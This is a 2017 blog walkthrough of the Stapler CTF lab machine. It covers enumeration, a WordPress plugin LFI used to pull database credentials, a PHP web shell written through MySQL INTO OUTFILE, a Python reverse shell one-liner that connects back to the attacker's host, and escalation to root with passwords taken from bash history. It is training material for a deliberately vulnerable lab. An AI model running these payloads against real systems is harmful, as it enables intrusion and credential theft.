---
layout: single
title: Stapler CTF Walkthrough
date: 2017-08-10
categories:
  - security
  - ctf
  - walkthrough
tags:
  - stapler
  - vulnhub
---
## Service Discovery
Running a port scan of the top 1000 ports using Nmap (`nmap -sS -sV -sC -vv 10.2.0.104`) revealed that the machine has a number of different public facing services; one of which Nmap was unable to fingerprint:

```
PORT     STATE  SERVICE     REASON         VERSION
20/tcp   closed ftp-data    reset ttl 64
21/tcp   open   ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp   open   ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny
53/tcp   open   domain      syn-ack ttl 64 dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp   open   http        syn-ack ttl 64 PHP cli server 5.5 or later
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   doom?       syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp open   mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, ODBCClient, LongPassword, InteractiveClient, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: a;C\x18YuU)RZC0\x0E\x0C\x08fv(\x0BJ
|_  Auth Plugin Name: 88
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.50%I=7%D=8/6%Time=598714A7%P=i686-pc-linux-gnu%r(NULL,2
SF:D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x152\
SF:0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04\x
SF:f5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2\x
SF:20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x0c
SF:\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb2\
SF:xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\xe
SF:eY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3\x
SF:08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0\x
SF:f8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x87\
SF:xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf4\
SF:xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xdc\
SF:]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5\x
SF:1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf\x
SF:bd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\xc
SF:3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x8a
SF:\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\xe7
SF:\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\xf
SF:6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x9a
SF:\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\xf1
SF:\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\xf8
SF:H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\xd
SF:7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\xd2
SF:\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\xf
SF:9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[\x
SF:93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xcc\
SF:[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7\x
SF:fa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\xfd
SF:\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96\x
SF:1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\xd
SF:0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\xe
SF:d\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x88
SF:\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbcL}
SF:AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\.n
SF:py\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\xf6
SF:~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf3\
SF:xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?\x
SF:fb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:EE:6E:0D (Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64254/tcp): CLEAN (Timeout)
|   Check 2 (port 39167/tcp): CLEAN (Timeout)
|   Check 3 (port 50868/udp): CLEAN (Failed to receive data)
|   Check 4 (port 38517/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2017-08-06T15:08:03+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol
```

## Samba
As Nmap was able to identify a Samba service that seemingly allowed guest access, I used `smbclient` to get a list of the available shares and began to enumerate them for information:

```shell_session
root@kali:~# smbclient -L \\RED -I 10.2.0.104
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

	Server               Comment
	---------            -------
	RED                  red server (Samba, Ubuntu)
```

The first share I took a look into was the `kathy` share; which contained three files:

* A todo list
* A WordPress archive
* A vsftpd configuration file

```shell_session
root@kali:~/stapler# smbclient //RED/kathy -I 10.2.0.104
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Fri Jun  3 17:52:52 2016
  ..                                  D        0  Mon Jun  6 22:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 16:02:27 2016
  backup                              D        0  Sun Jun  5 16:04:14 2016

		19478204 blocks of size 1024. 16397128 blocks available
smb: \> cd backup
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 16:04:14 2016
  ..                                  D        0  Fri Jun  3 17:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 16:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 18:14:46 2015

		19478204 blocks of size 1024. 16397128 blocks available
smb: \backup\> get vsftpd.conf
getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (1455.3 KiloBytes/sec) (average 1455.3 KiloBytes/sec)
smb: \backup\> get wordpress-4.tar.gz
getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (45730.3 KiloBytes/sec) (average 43517.5 KiloBytes/sec)
smb: \backup\> cd ..
smb: \> cd kathy_stuff\
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 16:02:27 2016
  ..                                  D        0  Fri Jun  3 17:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 16:02:27 2016

		19478204 blocks of size 1024. 16397128 blocks available
smb: \kathy_stuff\> get todo-list.txt
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (20.8 KiloBytes/sec) (average 840.5 KiloBytes/sec)
smb: \kathy_stuff\>
```

The `todo-list.txt` file contained the text, `I'm making sure to backup anything important for Initech, Kathy`; which led me to believe the WordPress archive may be one from a live deployment and contain a valid `wp-config.php`, but after inflating the archive (`tar -xvf wordpress-4.tar.gz`) it seemed that it just contained the core files for an installation, rather than being an actual backup.

Likewise, there was nothing of huge interest in the `vsftpd.conf` file; other than it confirming what Nmap had already found (i.e. that anonymous FTP access was enabled).

Next, I took a look at the `tmp` share, only to find a file named `ls` which contained the output of `ls` being executed on the machine:

```shell_session
root@kali:~/stapler# smbclient //RED/tmp -I 10.2.0.104
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
smb: \> ls
  .                                   D        0  Tue Jun  7 09:08:39 2016
  ..                                  D        0  Mon Jun  6 22:39:56 2016
  ls                                  N      274  Sun Jun  5 16:32:58 2016

		19478204 blocks of size 1024. 16397128 blocks available
smb: \> get ls
getting file \ls of size 274 as ls (89.2 KiloBytes/sec) (average 89.2 KiloBytes/sec)
smb: \>

root@kali:~/stapler# cat ls
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

Whilst I was taking a look at Samba, I also had a look for any vulnerabilities that could be leveraged at this stage that affect Samba 4.3.9, but none seemed applicable.

## Anonymous FTP
As the vsftpd configuration file and Nmap both indicated anonymous FTP access was enabled, I connected to see if there were any useful files. Only one file was present though, which was a note which potentially revealed a username (`elly`):

```shell_session
root@kali:~/stapler# ftp 10.2.0.104
Connected to 10.2.0.104.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
Name (10.2.0.104:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (52.2722 kB/s)
ftp>

root@kali:~/stapler# cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

## Reverse Domain Lookup
As there is both a web server and a DNS server present, I used `dig` to do a reverse lookup, to see if there are any hostnames associated with `127.0.0.1`, but only found `localhost`:

```shell_session
root@kali:~/stapler# dig +noall +answer -x 127.0.0.1 @10.2.0.104
1.0.0.127.in-addr.arpa.	0	IN	PTR	localhost.
```

## Port 666
Using `nc` to connect to port 666 to try and fingerprint the service manually resulted in it outputting some binary data and instantly closing the connection.

A closer look at the data retrieved led me to believe it was possibly a ZIP file, as there seemed to be a plaintext file name in the output:

![port_666](/assets/images/stapler-ctf-walkthrough/port_666.png)

Piping the output directly to a file (`nc 10.2.0.104 666 > 666.zip`) allowed me to unzip it and extract `message2.jpg`, which was a screenshot of some terminal output:

![message2.jpg](/assets/images/stapler-ctf-walkthrough/message2.jpg)

This suggested that a custom binary may have possibly been being used for the `echo` command that has a buffer overflow; for now though, as the service seemingly wasn't processing any input being passed to it, this was put on the bench.

## PHP CLI Server & Apache
Running `dirb` against port 80 (i.e. the PHP CLI server) didn't return much. It indicated that it was serving up the contents of a home directory, but began running into errors, even when throttling the request rate:

```
---- Scanning URL: http://10.2.0.104/ ----
+ http://10.2.0.104/.bashrc (CODE:200|SIZE:3771)
+ http://10.2.0.104/.profile (CODE:200|SIZE:675)

(!) FATAL: Too many errors connecting to host
    (Possible cause: EMPTY REPLY FROM SERVER)
```

With [seemingly] no low hanging fruit available, I did a full port scan and found another web server running. This time, it was Apache on port 12380:

```
PORT      STATE  SERVICE     REASON         VERSION
12380/tcp open   http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
```

Running `dirb` against port 12380 didn't return any results and the landing page, when accessed over HTTP, didn't elude to anything. Accessing over HTTPS, however, led to a page with the text `Internal Index Page!`

A look at the SSL certificate showed that the common name was `red.initech`:

![SSL certificate](/assets/images/stapler-ctf-walkthrough/ssl_cert.png)

I added `red.initech` to my hosts file to see if there was a vhost setup for it in Apache, but it led back to the same page as before.

Now that I had access to what was seemingly an internal web server, I began running `dirb` again, which uncovered a few interesting results:

```shell_session
root@kali:~/stapler# dirb https://red.initech:12380 /usr/share/wordlists/dirb/big.txt

***

---- Scanning URL: https://red.initech:12380/ ----
==> DIRECTORY: https://red.initech:12380/announcements/
==> DIRECTORY: https://red.initech:12380/javascript/
==> DIRECTORY: https://red.initech:12380/phpmyadmin/
+ https://red.initech:12380/robots.txt (CODE:200|SIZE:59)
+ https://red.initech:12380/server-status (CODE:403|SIZE:302)
```

The first thing I checked out from these results was the phpMyAdmin installation. By going to `https://red.initech:12380/phpmyadmin/doc/html/index.html` I was able to fingerprint the installation as version 4.5.4.1, which has no usable unauthenticated vulnerabilities that can be used against it.

Next, I checked out the `announcements` directory to see if there was any interesting information, but the only file was `message.txt` which contained the content: `Abby, we need to link the folder somewhere! Hidden at the mo`.

The `robots.txt` file, however, contained two interesting directories - `admin1122233` and `blogblog`. The admin directory redirected to an external website, but the `blogblog` directory contained a WordPress installation.

A quick look at the `wp-content/plugins` directory revealed that the directory listing was enabled and that I had full visibility of all installed plugins; one of which, seemed to contain an LFI vulnerability ([https://www.exploit-db.com/exploits/39646/](https://www.exploit-db.com/exploits/39646/))

The vulnerability allows unauthenticated users to create new posts, which also attaches a copy of the specified file into the uploads directory with a JPEG extension. As JPEG images won't be interpreted by PHP before being served, it allows for PHP files to be downloaded as plain text.

With this in mind, I used the vulnerability to create a copy of the `wp-config.php` file by visiting `https://red.initech:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=asdasd&short=rnd&term=rnd&thumb=../wp-config.php` and was then able to extract the MySQL credentials used by WordPress

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

As I now had credentials to login to phpMyAdmin with, I created a new WordPress account on `https://10.2.0.104:12380/blogblog/wp-login.php?action=register` and navigated to the `wp_users` table of the `wordpress` database and replaced the automatically generated password with an MD5 hash of my chosen password in the `user_pass` field.

In addition to setting a password, I also needed to set the `wp_user_level` option in the `wp_usermeta` table for my account to be `10`, i.e. an administrator (see [https://codex.wordpress.org/User_Levels](https://codex.wordpress.org/User_Levels)).

Lastly, I changed the `wp_capabilities` option in the `wp_usermeta` table to `a:1:{s:13:"administrator";b:1;}`, which finalised elevating my new account into a full administrator, with access to all management options:

![WordPress](/assets/images/stapler-ctf-walkthrough/wordpress.png)

With a full administrator account, I attempted to use the plugin and theme editor to store a reverse shell, but there was no write access to the plugins and themes directories.

Whilst looking around the admin area, I saw an error on the updates page which revealed the full path to the WordPress installation, which was: `/var/www/https/blogblog/`

As it's possible to save the output of a query in MySQL to a file, I used this path disclosure in combination with the phpMyAdmin login in an attempt to create a file containing `<?php phpinfo(); ?>`, for testing purposes, by running the query: `select '<?php phpinfo(); ?>' into OUTFILE '/var/www/https/blogblog/test.php'` but the top level directory of the blog was seemingly unwritable.

As I know for sure that the `wp-content/uploads` directory was writable, I modified the query to instead write there, and successfully got PHP execution:

![phpinfo](/assets/images/stapler-ctf-walkthrough/phpinfo.png)

With PHP execution now possible, I re-used the same query to create a command executor (`<?php echo shell_exec($_GET["e"]); ?>`), which would allow system commands to be executed, but didn't provide an interactive shell.

## Low Privilege Shell
Now that I had a way to execute system commands via the command executor, I started a listener using SuperTTY (https://github.com/bad-hombres/supertty):

```shell_session
root@kali:~/stapler# supertty --port 5555
 (                                        )                  
 )\ )                     *   )  *   ) ( /(          )    )  
(()/(  (          (  (  ` )  /(` )  /( )\())   )  ( /( ( /(  
 /(_))))\ `  )   ))\ )(  ( )(_))( )(_)|(_)\   /(( )\()))\())
(_)) /((_)/(/(  /((_|()\(_(_())(_(_())_ ((_) (_))((_)\((_)\  
/ __(_))(((_)_\(_))  ((_)_   _||_   _\ \ / / _)((_) (_)  (_)
\__ \ || | '_ \) -_)| '_| | |    | |  \ V /  \ V /| || () |  
|___/\_,_| .__/\___||_|   |_|    |_|   |_|    \_/ |_(_)__/   
         |_|                                                 
         (c) Bad Hombres 2017

[+] Starting a reverse listener on port: 5555
[+] Got terminal: xterm-256color
[+] Got terminal size (68 rows, 180 columns)
[+] Setting up local terminal.....
```

Then used the command executor to run some inline Python to connect back to the listener:

```
https://10.2.0.104:12380/blogblog/wp-content/uploads/cmd.php?e=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.2.0.3%22%2C5555%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
```

Now, I had a fully interactive shell and could start some recon!

## Recon & Privilege Escalation

Running `ps aux` showed that the `JKanode` user was running a HTTP server on port 8888, but it was of no use, as it was just serving up the home directory which I already had access to. `root` was also running a continuous script from the `/root` directory, but due to lack of permissions, I couldn't see what it was:

```
JKanode   1450  0.0  0.4  14696  4536 ?        S    15:02   0:02 python2 -m SimpleHTTPServer 8888
root      1410  0.0  0.2   5720  2196 ?        S    15:02   0:00 /bin/bash /root/python.sh
```

In case this script was listening for anything locally, I ran `netstat -a` to try and identify any previously unidentified services. Doing so, suggested a tftp service was running over UDP:

```
udp        0      0 *:tftp                  *:*    
```

A look at the `iptables` configuration also shows that all external UDP traffic is being accepted:

```shell_session
www-data@red:/home$ cat /etc/iptables/rules.v4
# Generated by iptables-save v1.6.0 on Fri Jun  3 22:08:54 2016
*filter
:INPUT DROP [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p udp -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -p tcp -m tcp --dport 20 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 21 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 123 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 137 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 138 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 139 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 666 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 3306 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 12380 -j ACCEPT
COMMIT
```

In the hope this may be misconfigured and allowing access into the `/root` directory or possibly allow for some service re-configuration, I used tftp to transfer a file across, and then used `find` to search the file system for the matching file name, but it led back to the `/srv/tftp` directory and was writing files as `nobody:nogroup`.

The home directory contained quite a lot of user directories, doing a listing of all of them using `ls -la *` revealed that `peter` had previously ran something using `sudo`; making this account one which would be useful to get access to:

```shell_session
peter:
total 72
drwxr-xr-x  3 peter peter  4096 Jun  3  2016 .
drwxr-xr-x 32 root  root   4096 Jun  4  2016 ..
-rw-------  1 peter peter     1 Jun  5  2016 .bash_history
-rw-r--r--  1 peter peter   220 Jun  3  2016 .bash_logout
-rw-r--r--  1 peter peter  3771 Jun  3  2016 .bashrc
drwx------  2 peter peter  4096 Jun  6  2016 .cache
-rw-r--r--  1 peter peter   675 Jun  3  2016 .profile
-rw-r--r--  1 peter peter     0 Jun  3  2016 .sudo_as_admin_successful
-rw-------  1 peter peter   577 Jun  3  2016 .viminfo
-rw-rw-r--  1 peter peter 39206 Jun  3  2016 .zcompdump
```

Listing the bash history for all users revealed a couple of interesting lines:

```
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
```

As I had just identified that `peter` has some sudo privileges, I tried to SSH into the machine using the credentials from the bash history, which let me in and presented me with a `zsh` setup screen. I simply exited this setup, and ran `/bin/bash` and checked the sudo privileges:

```shell_session
peter@red:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

As `peter` had full sudo privileges, I ran bash with sudo to get root access, and then proceeded to retrieve the flag:

```shell_session
peter@red:~$ sudo /bin/bash
root@red:~# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
root@red:/root# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

root@red:/root#
```

The total time taken to root this machine was 4 hours, 15 minutes
